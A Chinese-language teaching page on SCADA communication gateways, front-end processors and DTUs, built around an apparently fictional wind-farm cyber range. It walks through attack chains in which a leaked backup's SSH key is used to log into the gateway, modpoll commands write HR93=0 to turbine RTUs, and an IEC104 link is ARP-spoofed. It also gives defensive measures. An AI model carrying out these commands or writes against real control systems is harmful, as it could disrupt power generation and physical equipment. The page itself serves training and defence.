## 一句话概括

通信网关是 SCADA 与现场 RTU 之间唯一合法的通道，把不同协议、不同点号的现场设备翻译汇聚成统一点表；前置机在调度侧做规约处理与命令转发；DTU 装在现场专做数据透传。三者是同一件事在不同位置上的三种叫法。

## 原理

### 一、三个角色，一条链路

```text
现场设备          通信网关/DTU            前置机                  主站
RTU/PLC/IED  --Modbus/IEC61850-->  网关  --IEC104-->  前置机  --内部协议-->  SCADA/调度主站

     （采集侧的翻译官）        （通道上的唯一入口）   （调度侧的规约处理器）
```

定义：三个角色位置不同，做的是同一条链路的三段工作。

| 角色 | 位置 | 主要职责 | 靶场实例 |
|---|---|---|---|
| 通信网关 | 场站内，采集侧与站控层之间 | 多协议转换、点表汇聚、控制下行、路由约束 | `plain_scada_gateway` = 通信系统1 = `10.0.6.8` |
| 前置机 | 调度侧/远动出口 | 规约处理（IEC104 TypeID/IOA/COT/SBO）、命令转发、通道管理 | `frontend3-lower`（10.0.4.2）、`frontend3-upper`、`frontend4-sim` |
| DTU | 现场站点旁 | 数据透传、断点续传、本地缓存，把现场数据送上网络 | 平原链里的校验节点（DTU/安全监测角色，`10.0.5.7:8080`） |

DTU 装在现场，只做数据透传，靶场里它以校验节点（`10.0.5.7:8080`）的形态出现，下面重点展开通信网关与前置机这两段。

### 二、通信网关实际在做什么

平原链的 `plain_scada_gateway` 配置文件写得很清楚：

```ini
[gateway]
name=plain_scada_gateway
role=communication-system-1
platform_node=communication-system-1
platform_ip=10.0.6.8

[downstream]
protocol=Modbus TCP
targets_file=rtu_targets.csv

[pointmap]
file=pointmap.csv
addressing=zero_based_pdu
write_range=HR90-HR94
target_control=HR93 ActivePowerLimitPercent

[diagnostic]
diag_user=plain_diag
diag_key=gateway_diag_key.pem
```

逐段解读：

| 段 | 字段 | 含义 |
|---|---|---|
| `[gateway]` | name / role / platform_ip | 网关身份：`plain_scada_gateway`，通信系统1，`10.0.6.8` |
| `[downstream]` | protocol / targets_file | 下行侧用 Modbus TCP，设备清单在 `rtu_targets.csv` |
| `[pointmap]` | file / addressing / write_range / target_control | 点表文件、地址约定（zero_based_pdu）、允许写的区间 HR90-HR94、关键控制点 HR93 |
| `[diagnostic]` | diag_user / diag_key | 诊断用户 `plain_diag` 和诊断私钥 `gateway_diag_key.pem` |

对应的设备清单：

```csv
turbine,rtu_name,ip,port,unit_id
WT-01,WT01-RTU,10.0.5.6,502,1
WT-02,WT02-RTU,10.0.5.4,502,1
WT-03,WT03-RTU,10.0.5.5,502,1
```

### 三、"唯一合法通道"是什么意思

`route_note.txt` 把它写成了配置：

```text
plain-report-portal cannot access WT01/WT02/WT03 RTU tcp/502 directly.
plain_scada_gateway is the maintenance source allowed to reach WT01/WT02/WT03 RTU tcp/502.

Allowed route in the platform topology:
  plain_diag@10.0.6.8 -> WT01-RTU 10.0.5.6:502
  plain_diag@10.0.6.8 -> WT02-RTU 10.0.5.4:502
  plain_diag@10.0.6.8 -> WT03-RTU 10.0.5.5:502

Firewall policy:
  allow src=10.0.6.8 dst=10.0.5.6 tcp/502
  allow src=10.0.6.8 dst=10.0.5.4 tcp/502
  allow src=10.0.6.8 dst=10.0.5.5 tcp/502
  deny  src=any      dst=10.0.5.4-10.0.5.6 tcp/502
```

白名单的含义：

- 只有 `10.0.6.8` 可以作为 Modbus Master 连三台 RTU 的 502。
- 其他任何来源到 `10.0.5.4-10.0.5.6` 的 502 全部拒绝。
- 网关因此成了"咽喉要道"：攻击者要碰 RTU，必须先拿下网关。

这也是靶场设计的关键点：先拿网关，再从网关打 RTU。（VM 与 Docker 映射表原文："平原链的关键教学点不是攻击者直接从外部访问 502，而是通过 Web 漏洞获得 SCADA 备份，再进入通信系统位置，从通信系统作为 Modbus Master 写 PLC 子站。"）

### 四、为什么网关配置备份会泄露整条链

成因：地址、点表、路由与诊断凭据被打进同一个可下载的备份包，一次下载等于交出整条链的地图加钥匙。平原链的 `scada_gateway_backup_202607.zip` 解压后五个文件，每个对应链路上的一环：

| 文件 | 内容 | 泄露了什么 |
|---|---|---|
| `gateway.conf` | 网关名、角色、平台 IP、下行协议、点表路径、可写区间、关键控制点、诊断账号 | 网关地址 10.0.6.8、协议 Modbus TCP、控制点 HR93、诊断用户 plain_diag |
| `rtu_targets.csv` | 三台风机的 RTU 名称、IP、端口、Unit ID | 10.0.5.6 / 10.0.5.4 / 10.0.5.5:502，Unit ID = 1 |
| `pointmap.csv` | 全量点表：寄存器偏移、HMI 标签、权限、语义、安全范围 | HR93 = ActivePowerLimitPercent，RW，0-100 |
| `route_note.txt` | 允许/拒绝的路由与防火墙策略 | 哪条路是通的、哪个源地址被信任 |
| `gateway_diag_key.pem` | SSH 诊断私钥 | 等于门禁卡：`ssh -i gateway_diag_key.pem plain_diag@10.0.6.8` 直接进网关 |

## 报文/字段对照

进入网关后，攻击者的验证动作与含义：

```bash
whoami        -> plain_diag
hostname      -> plain-scada-gateway
ip -br addr   -> ens18 UP 10.0.6.8/24
sudo -l       -> 确认权限范围
ls -la ~      -> 家目录（含 modpoll 等工具）

nmap -sT -p 502 10.0.5.6
# PORT    STATE SERVICE
# 502/tcp open  modbus
```

`modpoll` 的读写命令（详见"PLC与RTU"页）：

```bash
# 读取（FC03）
modpoll -m tcp -p 502 -a 1 -0 -r 93 -c 1 -t 4 -1 10.0.5.6     # 期望 [93]: 100
# 写入（FC06）
modpoll -m tcp -p 502 -a 1 -0 -r 93 -c 1 -t 4 -1 10.0.5.6 0   # 期望 Written 1 reference.
```

前置机侧的对应概念（IEC104，出自山区链）：

```text
上层链路：frontend4-sim（前置机）表示省调到市调的转发链路
下层链路：frontend3-lower = 10.0.4.2，与 conpot-rtu-mnt = 10.0.4.5:2404 建立 IEC104 通信
被抓到的控制报文：TypeID=45 C_SC_NA_1, CA=3, IOA=10490, COT=activation, Test=1, SBO=Select→Execute
```

## 在攻击链里的位置

```text
平原链：
  报表系统 IDOR -> scada_gateway_backup_202607.zip
  -> ssh -i gateway_diag_key.pem plain_diag@10.0.6.8
  -> 网关成为攻击者的"位置跳板"（从管理侧跳到生产控制区的 Modbus 出口）
  -> 从网关写三台 RTU 的 HR93=0

山区链：
  工单系统 XSS -> 维护工作站 -> 发现 remote-link.yaml 里的 upstream_peer=10.0.4.2
  -> 前置机 frontend3-lower 与 RTU conpot 的 IEC104 链路被 ARP MITM
  -> 前置机的作用是"合法的转发者"，攻击者做的正是冒充它

海上链：
  edge-portal maintenance-gateway（维护网关，IT/OT 维护边界）
  -> Web Terminal -> offshore-maint-ws -> OPC UA Gateway -> 风机
```

三条链里各有一个"网关/前置"性质的节点，都是跨区的唯一通道，因此也是最高价值目标。

## 安全视角

典型薄弱点：

- `gateway_diag_key.pem` 与 `diag_user=plain_diag` 明文放在可下载的备份包里。
- 网关上装着 `modpoll` 等 Modbus Master 工具，既是运维便利，也是攻击者的现成武器。
- `sudo -l` 的范围没最小化时，一个诊断账号等于半台 root。
- 网关写 HR93 与 SCADA 正常下发，协议层区分不出运维写还是控制写。
- IEC104 的 Test 位本可标识"测试链路"，下游若把 `Test=1` 的报文一并执行，测试命令就变成正式控制。
- 只做透传的 DTU 发现不了值被篡改，旁路校验节点才有意义。

防护要点：

- 网关配置备份加密存放，绝不放进 Web 可下载目录；下载接口做对象归属校验（修掉 IDOR）。
- 诊断账号独立、最小权限、密钥可撤销、强制审计；诊断通道与业务通道分离。
- 网关侧强制点表级白名单，只放行写 HR90-HR94，每点做范围校验（HR93 落在 0-100）。
- 前置机严格区分 `Test` 位与正式控制，遥控强制走完整 `Select Before Operate`，校验序号防重放。
- 控制命令经网关/前置机时记录 IOA、类型、来源、时间、结果，并与调度侧日志对账。
- 采用"旁路校验"：另抄一份现场数据做 HMAC 验签、时间戳新鲜度、范围与跳变检查（平原链校验节点 `10.0.5.7:8080` 的原型），不改动原控制链路即可发现篡改。
